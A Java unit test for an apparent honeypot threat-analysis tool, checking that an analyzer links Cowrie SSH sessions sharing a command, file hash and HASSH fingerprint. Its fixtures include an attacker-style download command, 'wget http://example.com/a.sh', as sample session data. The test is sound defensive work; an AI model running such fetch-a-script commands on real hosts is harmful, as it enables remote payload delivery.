package users.rishik.threatPlatform.attack;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.Test;
import users.rishik.threatPlatform.attack.analysis.candidate.CandidatePairOverlapAnalyzer;
import users.rishik.threatPlatform.attack.analysis.candidate.CandidatePairOverlapReport;
import users.rishik.threatPlatform.attack.candidate.CandidateGenerationRules;
import users.rishik.threatPlatform.attack.candidate.CandidatePairGenerator;
import users.rishik.threatPlatform.attack.dto.SessionBehavior;
import users.rishik.threatPlatform.attack.service.RawCowrieEventReader;
import users.rishik.threatPlatform.attack.service.SessionBehaviorExtractor;

import java.lang.reflect.Method;
import java.time.LocalDateTime;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;

class CandidatePairOverlapAnalyzerTest {

    @Test
    void shouldDetectMultipleSignalsForSameCandidatePair()
            throws Exception {

        SessionBehavior session1 = session(
                "s1",
                List.of("wget http://example.com/a.sh"),
                List.of("hash-a"),
                "hassh-a"
        );

        SessionBehavior session2 = session(
                "s2",
                List.of("wget http://example.com/a.sh"),
                List.of("hash-a"),
                "hassh-a"
        );

        SessionBehavior session3 = session(
                "s3",
                List.of("whoami"),
                List.of("hash-b"),
                "hassh-b"
        );

        List<SessionBehavior> sessions =
                List.of(session1, session2, session3);

        CandidateGenerationRules rules =
                new CandidateGenerationRules(100);

        CandidatePairGenerator candidatePairGenerator =
                new CandidatePairGenerator(rules);

        CandidatePairOverlapAnalyzer analyzer =
                new CandidatePairOverlapAnalyzer(
                        candidatePairGenerator,
                        new RawCowrieEventReader(new ObjectMapper()),
                        new SessionBehaviorExtractor()
                );

        Method analyzeSessions =
                CandidatePairOverlapAnalyzer.class
                        .getDeclaredMethod(
                                "analyzeSessions",
                                List.class
                        );

        analyzeSessions.setAccessible(true);

        CandidatePairOverlapReport report =
                (CandidatePairOverlapReport)
                        analyzeSessions.invoke(
                                analyzer,
                                sessions
                        );

        /*
         * session1 <-> session2 share:
         * - command
         * - file hash
         * - HASSH
         *
         * Therefore:
         * 3 candidate-generation paths
         * 1 unique candidate pair
         * 3 independent signal types
         */

        assertEquals(
                3,
                report.totalCandidatePairsBeforeDeduplication()
        );

        assertEquals(
                1,
                report.uniqueCandidatePairs()
        );

        assertEquals(
                0,
                report.singleSignalPairs()
        );

        assertEquals(
                0,
                report.twoSignalPairs()
        );

        assertEquals(
                1,
                report.threeSignalPairs()
        );

        assertEquals(
                0,
                report.fourSignalPairs()
        );

        assertEquals(
                1,
                report.signalCombinationCounts()
                        .get("COMMAND+FILE_HASH+HASSH")
        );
    }

    private SessionBehavior session(
            String sessionId,
            List<String> commands,
            List<String> fileHashes,
            String hassh
    ) {

        LocalDateTime time =
                LocalDateTime.of(
                        2025,
                        6,
                        27,
                        10,
                        0
                );

        return new SessionBehavior(
                sessionId,
                "192.168.1.1",
                "192.168.1.2",
                "sensor-1",
                1,
                time,
                time.plusSeconds(10),
                List.of("cowrie.session.connect"),
                commands,
                false,
                true,
                hassh,
                "SSH-2.0-test",
                fileHashes,
                List.of(),
                List.of(),
                List.of()
        );
    }
}